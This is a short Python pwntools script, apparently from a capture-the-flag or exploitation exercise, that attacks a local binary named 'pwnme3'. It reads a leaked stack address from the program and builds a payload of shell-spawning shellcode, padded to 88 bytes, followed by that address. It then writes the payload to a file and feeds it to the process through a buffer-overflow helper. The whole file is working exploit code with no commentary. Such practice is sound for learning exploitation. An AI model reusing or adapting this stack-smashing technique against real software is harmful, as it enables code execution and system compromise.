import pwn
from templates import buff_overflow


def main():
    pwn.context.arch = 'amd64'
    proc = pwn.process('./pwnme3')

    proc.recvuntil(b"What's this?")
    leak = proc.recvline().strip()
    print(leak)

    shell_code = pwn.asm(pwn.shellcraft.sh())
    payload = shell_code + b"a" * (88 - len(shell_code)) + pwn.p64(int(leak, 16))
    with open("payload_file", "wb") as file:
        file.write(payload)


    buff_overflow(
        payload,
        proc,
        interactive = False
    )


main()
